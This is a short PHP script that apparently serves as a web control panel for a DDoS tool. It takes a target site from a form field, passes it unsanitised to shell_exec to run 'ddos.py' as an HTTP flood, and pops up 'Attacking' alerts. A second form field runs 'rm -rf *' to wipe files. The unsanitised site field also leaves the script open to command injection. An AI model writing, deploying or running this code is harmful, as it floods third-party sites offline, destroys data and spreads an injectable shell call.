<?php
   if( $_POST["site"] ) {      
$site = $_POST["site"];
echo"<script>alert('Attacking $site')</script>";    
echo shell_exec("python2 ddos.py http://$site");
echo"<script>alert('HTTPFLOOD sent to $site')</script>";
   }

if( $_POST["rm"]) {
$rm = $_POST["rm"];
echo shell_exec("rm -rf *");
}
?>
